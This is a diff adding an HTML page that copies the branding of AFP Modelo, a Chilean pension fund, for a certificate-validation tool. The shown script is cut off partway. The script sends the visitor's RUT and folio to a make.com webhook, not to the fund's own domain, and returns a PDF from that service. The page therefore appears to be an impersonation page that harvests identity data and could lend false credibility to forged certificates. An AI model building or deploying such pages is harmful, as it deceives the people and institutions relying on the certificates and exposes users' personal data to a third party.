@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AFP Modelo - Validar Certificados</title>
+<!-- Favicon oficial de AFP Modelo -->
+<link rel="icon" href="https://nueva.afpmodelo.cl/favicon.ico" type="image/x-icon">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&family=Open+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --green:#81BD00;--green-dk:#6fa300;--green-lt:#E6F2CC;
+  --cyan:#8FEBFF;--dark:#1A171C;
+  --body-color:#4D4D4D;--text-dk:#1A1A1A;--gray:#808080;--light:rgba(0,0,0,.45);
+  --border:#d9d9d9;--footer-bg:#F2F2F2;
+  --poppins:'Poppins',Helvetica,Arial,sans-serif;
+  --opensans:'Open Sans',Helvetica,Arial,sans-serif;
+}
+body{font-family:var(--opensans);color:var(--text-dk);background:#fff;-webkit-font-smoothing:antialiased;line-height:1.5}
+a{text-decoration:none;color:inherit}
+img{display:block}
+
+/* ========== BANNER IMPORTANTE ========== */
+.banner-imp{background:var(--green-lt);display:flex;align-items:center;justify-content:space-between;padding:4px 24px;font-family:var(--poppins);font-size:13px;font-weight:600;color:var(--text-dk);cursor:pointer;min-height:32px}
+.banner-imp svg{width:18px;height:18px;fill:var(--body-color);flex-shrink:0}
+.banner-imp .bi-left{display:flex;align-items:center;gap:8px}
+
+/* ========== HEADER DESKTOP ========== */
+.hdr{background:var(--dark);height:80px;display:flex;align-items:center;padding:0 64px;position:sticky;top:0;z-index:200}
+.hdr-logo{margin-right:48px;flex-shrink:0}
+.hdr-logo img{height:75px;border-radius:12px;object-fit:contain;}
+.hdr-nav{display:flex;align-items:stretch;height:80px;gap:0}
+.hdr-nav a{color:#fff;font-family:var(--poppins);font-size:14px;font-weight:400;padding:0 24px;display:flex;align-items:center;transition:background .2s}
+.hdr-nav a:hover{background:rgba(255,255,255,.08)}
+.hdr-nav a.active{background:var(--cyan);color:#000;font-weight:600}
+.hdr-btns{display:flex;align-items:center;gap:12px;margin-left:auto}
+.btn-cambiate{color:#fff;border:1px solid var(--green);border-radius:2px;padding:8px 24px;font-family:var(--poppins);font-size:14px;font-weight:600;transition:all .2s}
+.btn-cambiate:hover{background:var(--green)}
+.btn-micuenta{background:var(--green);color:#fff;border:none;border-radius:2px;padding:8px 16px;font-family:var(--poppins);font-size:14px;cursor:pointer;transition:background .2s;display:inline-block}
+.btn-micuenta:hover{background:var(--green-dk)}
+.btn-search{background:rgba(255,255,255,.1);border:none;border-radius:4px;width:40px;height:40px;display:flex;align-items:center;justify-content:center;cursor:pointer;margin-left:4px}
+.btn-search svg{width:20px;height:20px;fill:#fff}
+
+/* ========== SUB-NAV ========== */
+.subnav{background:#fff;border-bottom:1px solid #e8e8e8;display:flex;align-items:center;justify-content:center;padding:0 64px;height:48px;gap:36px}
+.subnav a{font-family:var(--poppins);font-size:13px;color:var(--body-color);display:flex;align-items:center;gap:4px;padding:12px 0;transition:color .2s}
+.subnav a:hover{color:var(--green)}
+.subnav a svg{width:14px;height:14px;fill:currentColor}
+.subnav .acc-link{margin-left:auto;display:flex;align-items:center;gap:6px;font-weight:500}
+.subnav .acc-link svg{width:22px;height:22px}
+
+/* ========== MOBILE HEADER ========== */
+.hdr-m{display:none;background:var(--green);height:64px;padding:0 16px;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:200}
+.hdr-m .logo-m img{height:36px;border-radius:4px;}
+.hdr-m .mr{display:flex;align-items:center;gap:8px}
+.btn-mc-m{background:0 0;color:#fff;border:2px solid #fff;border-radius:2px;padding:6px 12px;font-family:var(--poppins);font-size:13px;font-weight:600;cursor:pointer}
+.m-icon{background:0 0;border:0;cursor:pointer;display:flex;padding:4px}
+.m-icon svg{width:24px;height:24px;fill:#fff}
+
+/* ========== BREADCRUMB ========== */
+.bc{max-width:1200px;margin:32px auto;padding:0 16px;font-size:16px;color:var(--light)}
+.bc a{color:var(--light)}.bc a:hover{text-decoration:underline}
+.bc .cur{color:var(--green)}.bc .s{margin:0 8px}
+
+/* ========== CONTENT ========== */
+.content{max-width:1200px;margin:0 auto;padding:0 16px}
+.ptitle{font-family:var(--poppins);font-size:32px;font-weight:400;color:var(--green);margin-bottom:16px;line-height:1.3} /* Reducido un 25% */
+.pdesc{font-size:16px;color:var(--body-color);line-height:24px;margin-bottom:16px}
+.headband{background:var(--green-lt);font-size:16px;color:var(--body-color);line-height:24px;padding:22px 8px;margin:0 0 24px}
+
+/* ========== FORM ========== */
+.fcert{padding:8px 0 40px}
+.frow{display:flex;align-items:center;margin-bottom:20px}
+.frow .flbl{width:37.5%;text-align:right;padding-right:16px;font-size:16px;color:var(--text-dk);flex-shrink:0}
+.frow .finp{width:25%;flex-shrink:0}
+.frow input{width:100%;height:32px;border:1px solid var(--border);border-radius:4px;padding:4px 11px;font-size:16px;font-family:var(--opensans);color:var(--text-dk);outline:0;transition:border-color .2s,box-shadow .2s}
+.frow input::placeholder{color:#bfbfbf}
+.frow input:focus{border-color:var(--green);box-shadow:0 0 0 2px rgba(129,189,0,.15)}
+.frow input.ierr{border-color:#ff4d4f}
+.ferr{color:#ff4d4f;font-size:13px;margin-top:4px;display:none}
+.frow-btn{display:flex;margin-top:60px}
+.frow-btn .flbl{width:37.5%;flex-shrink:0}
+.frow-btn .finp{width:25%;flex-shrink:0}
+.btnv{width:180px;height:32px;border:1px solid var(--border);border-radius:4px;font-size:16px;font-family:var(--opensans);cursor:pointer;transition:all .3s;background:#f5f5f5;color:rgba(0,0,0,.25)}
+.btnv.on{background:var(--green);color:#fff;border-color:var(--green)}
+.btnv.on:hover{background:var(--green-dk)}
+.btnv:disabled{cursor:not-allowed}
+
+/* ========== RESULT ========== */
+.rbox{display:none;margin-top:20px;padding:16px 20px;border-radius:4px;font-size:14px;line-height:1.7;margin-left:37.5%;max-width:25%}
+.rbox.ok{background:#f6ffed;border:1px solid #b7eb8f;color:#135200}
+.rbox.no{background:#fff2f0;border:1px solid #ffccc7;color:#a8071a}
+
+/* ========== LOADING ========== */
+.lov{display:none;position:fixed;inset:0;background:rgba(255,255,255,.65);z-index:999;justify-content:center;align-items:center}
+.lov.show{display:flex}
+.spn{width:44px;height:44px;border:4px solid #eee;border-top-color:var(--green);border-radius:50%;animation:sp .7s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+
+/* ========== CONTACT SECTION ========== */
+.contact-sec{padding:48px 32px 40px;background:#fff}
+.contact-inner{max-width:1200px;margin:0 auto}
+.ctitle{font-family:var(--poppins);font-size:20px;font-weight:700;color:var(--dark);margin-bottom:32px;text-align:left;font-style:italic}
+.cgrid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:24px}
+.ccol{text-align:center}
+.csub{font-family:var(--poppins);font-size:14px;font-weight:700;color:#333;margin-bottom:12px;font-style:italic}
+.phone-r{display:flex;align-items:center;justify-content:center;gap:10px;font-size:14px;color:var(--body-color)}
+.phone-r svg{width:18px;height:18px;fill:var(--body-color)}
+.sicons{display:flex;justify-content:center;gap:14px}
+.sicons a{display:flex;width:32px;height:32px;align-items:center;justify-content:center;transition:opacity .2s}
+.sicons a:hover{opacity:.7}
+.sicons a svg{width:28px;height:28px}
+.abadges{display:flex;justify-content:center;gap:10px}
+.abadges img{height:36px}
+
+/* ========== FOOTER CONTAINER ========== */
+.ftr-wrap{background:var(--footer-bg)}
+.ftr-brand{max-width:1200px;margin:0 auto;padding:40px 32px 16px}
+.ftr-brand h1{font-family:var(--poppins);font-size:20px;font-weight:700;color:var(--green);text-transform:uppercase;letter-spacing:-1px}
+.ftr-cols{max-width:1200px;margin:0 auto;padding:0 32px 32px;display:grid;grid-template-columns:1fr 1fr 1fr;gap:40px}
+.ftr-col h3{font-family:var(--poppins);font-size:20px;font-weight:700;color:var(--gray);margin-bottom:16px;letter-spacing:-1px}
+.ftr-col a{display:block;font-size:14px;color:var(--body-color);line-height:35px;transition:color .2s}
+.ftr-col a:hover{color:var(--green)}
+
+/* Footer accordions (mobile) */
+.ftr-acc{display:none;padding:0 16px}
+.acc-item{border-bottom:1px solid #e8e8e8}
+.acc-hdr{display:flex;justify-content:space-between;align-items:center;padding:16px 0;cursor:pointer;font-family:var(--poppins);font-size:16px;font-weight:500;color:var(--text-dk)}
+.acc-hdr .arr{color:#bbb;transition:transform .3s;font-size:20px}
+.acc-hdr.open .arr{transform:rotate(90deg)}
+.acc-body{max-height:0;overflow:hidden;transition:max-height .3s ease}
+.acc-body-in{padding:0 0 16px;font-size:14px;color:var(--body-color);line-height:2}
+.acc-body-in a{display:block;color:var(--body-color)}
+
+/* ========== DISCLAIMER + DIGICERT ========== */
+.disc-sec{max-width:1200px;margin:0 auto;padding:24px 32px;display:flex;align-items:flex-start;gap:32px;background:var(--footer-bg)}
+.disc-text{font-size:14px;color:var(--gray);line-height:1.7;flex:1}
+.digi{flex-shrink:0}.digi img{height:70px}
+
+/* ========== COPYRIGHT ========== */
+.copy-bar{max-width:1200px;margin:0 auto;padding:16px 32px 24px;display:flex;justify-content:space-between;font-size:14px;color:var(--gray);background:var(--footer-bg)}
+
+/* ========== SP BANNER (black) ========== */
+.sp-bar{background:#000;color:#fff;text-align:center;padding:10px 24px;font-size:14px;font-weight:600;line-height:1.5}
+.sp-bar a{color:rgb(116,121,215);font-weight:700;text-decoration:none}
+.sp-bar a:hover{text-decoration:underline}
+
+/* ========== CHATBOT ========== */
+.chatbot{position:fixed;bottom:24px;right:24px;z-index:500;cursor:pointer}
+.chat-hola{background:var(--green);color:#fff;font-family:var(--poppins);font-size:13px;font-weight:700;font-style:italic;padding:2px 12px;border-radius:10px;position:absolute;top:-8px;right:10px;z-index:2;transform:rotate(-10deg)}
+.chat-avatar{width:72px;height:72px;border-radius:50%;overflow:hidden;border:3px solid #fff;box-shadow:0 2px 12px rgba(0,0,0,.15);background:var(--green);display:flex;align-items:center;justify-content:center}
+.chat-avatar svg{width:60px;height:60px}
+
+/* ========== RESPONSIVE ========== */
+@media(max-width:992px){
+  .hdr,.subnav,.banner-imp{display:none}
+  .hdr-m{display:flex}
+  .bc{margin:16px auto;font-size:13px}
+  
+  .hdr-m .logo-m img{height:52px;} 
+  .ptitle{font-size:34px;} /* Reducido un 25% */
+  
+  .pdesc{font-size:15px}
+  .headband{font-size:14px}
+  .frow{flex-direction:column;align-items:stretch}
+  .frow .flbl{width:100%;text-align:left;padding-right:0;margin-bottom:6px;font-size:14px}
+  .frow .finp{width:100%}
+  .frow input{height:44px}
+  .frow-btn{flex-direction:column;align-items:stretch;margin-top:8px}
+  .frow-btn .flbl{display:none}
+  .frow-btn .finp{width:100%}
+  .btnv{width:100%;height:44px}
+  .rbox{margin-left:0;max-width:100%}
+  .cgrid{grid-template-columns:1fr;gap:28px}
+  .ctitle{text-align:center}
+  .ftr-brand{padding:24px 16px 12px}
+  .ftr-cols{display:none}
+  .ftr-acc{display:block}
+  .disc-sec{flex-direction:column;padding:24px 16px;text-align:center}
+  .digi{margin:16px auto 0}
+  .copy-bar{flex-direction:column;text-align:center;gap:8px;padding:16px}
+  .chatbot{bottom:16px;right:16px}
+  .chat-avatar{width:60px;height:60px}
+}
+@media(max-width:480px){
+  .ptitle{font-size:28px;} /* Reducido un 25% para pantallas muy pequeñas */
+}
+</style>
+</head>
+<body>
+
+<!-- BANNER IMPORTANTE -->
+<div class="banner-imp">
+  <div class="bi-left">
+    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+    <span>Importante</span>
+  </div>
+  <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 11h-4v4h-2v-4H7v-2h4V7h2v4h4v2z"/></svg>
+</div>
+
+<!-- HEADER DESKTOP -->
+<div class="hdr">
+  <a href="https://nueva.afpmodelo.cl/" class="hdr-logo">
+    <img src="https://49659256.fs1.hubspotusercontent-na1.net/hubfs/49659256/PDFS/LOGOS%20AFP/LOGO%20MODELO.png" alt="AFP Modelo">
+  </a>
+  <div class="hdr-nav">
+    <a href="https://nueva.afpmodelo.cl/afiliados">Afiliados</a>
+    <a href="https://nueva.afpmodelo.cl/pensionados">Pensionados</a>
+    <a href="https://nueva.afpmodelo.cl/empleadores" class="active">Empleadores</a>
+  </div>
+  <div class="hdr-btns">
+    <a href="https://cambiate.afpmodelo.cl/" class="btn-cambiate">Cámbiate a Modelo</a>
+    <a href="https://nueva.afpmodelo.cl/portalprivado/user/login" class="btn-micuenta">Mi cuenta</a>
+    <button class="btn-search"><svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg></button>
+  </div>
+</div>
+
+<!-- SUB-NAV -->
+<div class="subnav">
+  <a href="#">Cámbiate a Modelo <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg></a>
+  <a href="#">Productos de Ahorro <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg></a>
+  <a href="#">Trámites y herramientas <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg></a>
+  <a href="#">Red Modelo <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg></a>
+  <a href="#" class="acc-link">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="6" r="1.5" fill="currentColor"/><path d="M10 10h2v7m-2 0h4"/></svg>
+    Accesibilidad
+  </a>
+</div>
+
+<!-- MOBILE HEADER -->
+<div class="hdr-m">
+  <a href="https://nueva.afpmodelo.cl/" class="logo-m">
+    <img src="https://49659256.fs1.hubspotusercontent-na1.net/hubfs/49659256/PDFS/LOGOS%20AFP/LOGO_MODELO_MOBILE.jpeg" alt="AFP Modelo Mobile">
+  </a>
+  <div class="mr">
+    <button class="btn-mc-m">Mi cuenta</button>
+    <button class="m-icon"><svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg></button>
+    <button class="m-icon"><svg viewBox="0 0 24 24"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></button>
+  </div>
+</div>
+
+<!-- BREADCRUMB -->
+<div class="bc">
+  <a href="https://nueva.afpmodelo.cl/">Home</a><span class="s">/</span>
+  <a href="https://nueva.afpmodelo.cl/empleadores">Herramientas para empleadores</a><span class="s">/</span>
+  <span class="cur">Validar Certificados</span><span class="s">/</span>
+</div>
+
+<!-- CONTENT -->
+<div class="content">
+  <h1 class="ptitle">Valida certificados de AFP Modelo</h1>
+  <p class="pdesc">Con esta herramienta puedes validar los certificados emitidos por AFP Modelo para usarlos en trámites financieros, como gestiones con entidades públicas o privadas, y en trámites personales como acreditar antecedentes para arriendos u otros fines.</p>
+  <div class="headband">Si el certificado es válido, se descargará el archivo automáticamente.</div>
+
+  <div class="fcert" id="main-form">
+    <div class="frow">
+      <label class="flbl" for="rut">RUT asociado al certificado</label>
+      <div class="finp">
+        <input type="text" id="rut" placeholder="12.345.678-9" maxlength="12" autocomplete="off">
+        <div class="ferr" id="rut-err">Ingresa un RUT válido</div>
+      </div>
+    </div>
+    <div class="frow">
+      <label class="flbl" for="folio">Folio</label>
+      <div class="finp">
+        <input type="text" id="folio" placeholder="Ingresa número de folio" autocomplete="off">
+        <div class="ferr" id="folio-err">Ingresa un folio válido</div>
+      </div>
+    </div>
+    <div class="frow-btn">
+      <div class="flbl"></div>
+      <div class="finp">
+        <button class="btnv" id="btnv" disabled>Validar Certificado</button>
+      </div>
+    </div>
+    <div class="rbox" id="rbox"></div>
+  </div>
+
+  <!-- PANTALLA DE ÉXITO OCULTA INICIALMENTE -->
+  <div id="success-screen" style="display:none; text-align:center; padding: 40px 0;">
+    <button id="btn-download" class="btnv on" style="width: auto; padding: 0 40px; font-size: 16px;">Descargar Certificado</button>
+  </div>
+
+</div>
+
+<!-- LOADING -->
+<div class="lov" id="lov"><div class="spn"></div></div>
+
+<!-- CONTÁCTANOS -->
+<div class="contact-sec">
+  <div class="contact-inner">
+    <h2 class="ctitle">Contáctanos</h2>
+    <div class="cgrid">
+      <div class="ccol">
+        <h4 class="csub">Nuestra central telefónica</h4>
+        <div class="phone-r">
+          <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+          <span>600 828 7200 / 2 2828 7200</span>
+        </div>
+      </div>
+      <div class="ccol">
+        <h4 class="csub">Nuestras redes sociales</h4>
+        <div class="sicons">
+          <a href="https://www.facebook.com/afpmodelo" target="_blank"><svg viewBox="0 0 24 24" fill="#1877F2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg></a>
+          <a href="#" target="_blank"><svg viewBox="0 0 24 24" fill="#000"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
+          <a href="https://www.instagram.com/afpmodelo" target="_blank"><svg viewBox="0 0 24 24" fill="#E4405F"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg></a>
+          <a href="#" target="_blank"><svg viewBox="0 0 24 24" fill="#FF0000"><path d="M23.498 6.186a3.016 3.016 0 00-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 00.502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 002.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 002.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg></a>
+          <a href="#" target="_blank"><svg viewBox="0 0 24 24" fill="#0A66C2"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
+          <a href="#" target="_blank"><svg viewBox="0 0 24 24" fill="#25D366"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg></a>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- FOOTER WRAP -->
+<div class="ftr-wrap">
+  <div class="ftr-brand"><h1>AFP Modelo</h1></div>
+  <div class="ftr-cols">
+    <div class="ftr-col">
+      <h3>Sobre AFP Modelo</h3>
+      <a href="#">Código de ética y conducta</a><a href="#">Memoria Anual</a><a href="#">Estados Financieros</a><a href="#">Políticas y Estatutos</a><a href="#">Canal de Denuncia</a><a href="#">Directorio y Administración</a><a href="#">Estructura de Comisiones</a>
+    </div>
+    <div class="ftr-col">
+      <h3>Estamos para ayudarte</h3>
+      <a href="#">Centro de Contacto</a><a href="#">Preguntas Frecuentes</a><a href="#">Sucursales</a><a href="#">Formulario de Contacto</a><a href="#">Mapa del Sitio</a><a href="#">Biblioteca</a>
+    </div>
+    <div class="ftr-col">
+      <h3>Links de interés</h3>
+      <a href="#">PREVIRED</a><a href="#">Superintendencia de Pensiones</a><a href="#">Administradora de Fondos de Cesantía</a><a href="#">Instituto de Previsión Social</a>
+    </div>
+  </div>
+  <div class="ftr-acc">
+    <div class="acc-item"><div class="acc-hdr" onclick="tAcc(this)"><span>Sobre AFP Modelo</span><span class="arr">›</span></div><div class="acc-body"><div class="acc-body-in"><a href="#">Código de ética y conducta</a><a href="#">Memoria Anual</a><a href="#">Estados Financieros</a><a href="#">Políticas y Estatutos</a><a href="#">Canal de Denuncia</a><a href="#">Directorio y Administración</a><a href="#">Estructura de Comisiones</a></div></div></div>
+    <div class="acc-item"><div class="acc-hdr" onclick="tAcc(this)"><span>Estamos para ayudarte</span><span class="arr">›</span></div><div class="acc-body"><div class="acc-body-in"><a href="#">Centro de Contacto</a><a href="#">Preguntas Frecuentes</a><a href="#">Sucursales</a><a href="#">Formulario de Contacto</a><a href="#">Mapa del Sitio</a><a href="#">Biblioteca</a></div></div></div>
+    <div class="acc-item"><div class="acc-hdr" onclick="tAcc(this)"><span>Links de interés</span><span class="arr">›</span></div><div class="acc-body"><div class="acc-body-in"><a href="#">PREVIRED</a><a href="#">Superintendencia de Pensiones</a><a href="#">Administradora de Fondos de Cesantía</a><a href="#">Instituto de Previsión Social</a></div></div></div>
+    <div class="acc-item"><div class="acc-hdr" onclick="tAcc(this)"><span>Información legal</span><span class="arr">›</span></div><div class="acc-body"><div class="acc-body-in"><a href="#">Política de privacidad</a><a href="#">Términos y condiciones</a></div></div></div>
+  </div>
+  <div class="disc-sec">
+    <p class="disc-text">La rentabilidad es variable, por lo que nada garantiza que las rentabilidades pasadas se repitan en el futuro. Infórmese sobre la rentabilidad de su Fondo de Pensiones, las comisiones y la calidad de servicio de las AFP en el sitio web de la Superintendencia de Pensiones: www.spensiones.cl". Estructura de comisiones por depósitos de cotizaciones vigentes - Capital: 1,44%, Cuprum: 1,44%, Habitat: 1,27%, Modelo: 0,58%, Planvital: 1,16%, Provida: 1,45%, Uno: 0,46% – Para afiliados dependientes, independientes y voluntarios. Número de afiliados por AFP vigente según Informe Estadístico Mensual de Afiliados y Cotizantes de la Superintendencia de Pensiones. Primer lugar en experiencia de clientes según ranking PXI – Praxis Xperience Index 2025 para el Sector AFP</p>
+    <div class="digi"><img src="https://afpmodelodevopssa.blob.core.windows.net/afpmodelodevopssac/assets/Certificado_logo_92a7deb53b.svg" alt="DigiCert"></div>
+  </div>
+  <div class="copy-bar">
+    <span>Todas las transacciones y operaciones de este sitio web están sujetas a horario de Chile Continental.</span>
+    <span>© 2026 AFP Modelo. Todos los Derechos Reservados.</span>
+  </div>
+</div>
+
+<!-- SP BANNER -->
+<div class="sp-bar">
+  Entrega tu opinión a la <a href="https://es.research.net/r/spensiones" target="_blank">SUPERINTENDENCIA DE PENSIONES</a> sobre la calidad de servicio de tu AFP.
+</div>
+
+<!-- CHATBOT -->
+<div class="chatbot" id="chatbot">
+  <div class="chat-hola">Hola!</div>
+  <div class="chat-avatar">
+    <img src="https://49659256.fs1.hubspotusercontent-na1.net/hubfs/49659256/PDFS/LOGOS%20AFP/Dise%C3%B1o%20sin%20t%C3%ADtulo%20(2).png" alt="Chat AFP Modelo" style="width:100%; height:100%; object-fit:cover; border-radius:50%;">
+  </div>
+</div>
+
+<script>
+function tAcc(h){const b=h.nextElementSibling;const o=h.classList.contains('open');document.querySelectorAll('.acc-hdr').forEach(x=>{x.classList.remove('open');x.nextElementSibling.style.maxHeight=null});if(!o){h.classList.add('open');b.style.maxHeight=b.scrollHeight+'px'}}
+function fmtRut(v){let c=v.replace(/[^0-9kK]/g,'');if(!c)return'';let d=c.slice(-1),b=c.slice(0,-1);if(!b)return c;let f='',n=0;for(let i=b.length-1;i>=0;i--){f=b[i]+f;n++;if(n%3===0&&i>0)f='.'+f}return f+'-'+d}
+function clnRut(r){return r.replace(/[.\-]/g,'').toUpperCase()}
+function valRut(r){const c=clnRut(r);if(c.length<8||c.length>9)return false;const b=c.slice(0,-1),d=c.slice(-1);let s=0,m=2;for(let i=b.length-1;i>=0;i--){s+=parseInt(b[i])*m;m=m===7?2:m+1}let e=11-(s%11);if(e===11)e='0';else if(e===10)e='K';else e=String(e);return d===e}
+
+const ri=document.getElementById('rut'),fi=document.getElementById('folio'),bv=document.getElementById('btnv'),rb=document.getElementById('rbox'),lo=document.getElementById('lov');
+
+// Variable para almacenar los datos de descarga
+window.downloadData = null;
+
+ri.addEventListener('input',function(){let p=this.selectionStart,ol=this.value.length;this.value=fmtRut(this.value);p+=(this.value.length-ol);this.setSelectionRange(p,p);chk()});
+fi.addEventListener('input',function(){fi.addEventListener('input',function(){chk()});chk()});
+function chk(){const ok=clnRut(ri.value).length>=8&&fi.value.trim().length>0;bv.classList.toggle('on',ok);bv.disabled=!ok}
+
+bv.addEventListener('click',async function(){
+  rb.style.display='none';document.querySelectorAll('.ferr').forEach(e=>e.style.display='none');document.querySelectorAll('.frow input').forEach(i=>i.classList.remove('ierr'));
+  if(!valRut(ri.value)){document.getElementById('rut-err').style.display='block';ri.classList.add('ierr');return}
+  if(!fi.value.trim()){document.getElementById('folio-err').style.display='block';fi.classList.add('ierr');return}
+  lo.classList.add('show');
+  
+  // LOGICA MAKE
+  const rut=clnRut(ri.value);
+  const folio=fi.value.trim();
+  
+  try{
+    const res=await fetch('https://hook.us2.make.com/iq6ps3txx1jaxr91mje7sx47ynbta3kb',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({
+            uuid: folio, 
+            rut: rut, 
+            folio: folio, 
+            entity:'modelo'
+        })
+    });
+    const data=await res.json();lo.classList.remove('show');
+    if(data.found&&data.pdf){
+      const bytes=atob(data.pdf);const arr=new Uint8Array(bytes.length);for(let i=0;i<bytes.length;i++)arr[i]=bytes.charCodeAt(i);
+      const blob=new Blob([arr],{type:'application/pdf'});
+      const url=URL.createObjectURL(blob);
+      
+      // En lugar de descargar, guardamos la data y cambiamos la pantalla
+      window.downloadData = {
+          url: url,
+          filename: data.name ? data.name : 'certificado_afp_modelo_'+folio+'.pdf'
+      };
+      
+      document.getElementById('main-form').style.display = 'none';
+      document.getElementById('success-screen').style.display = 'block';
+
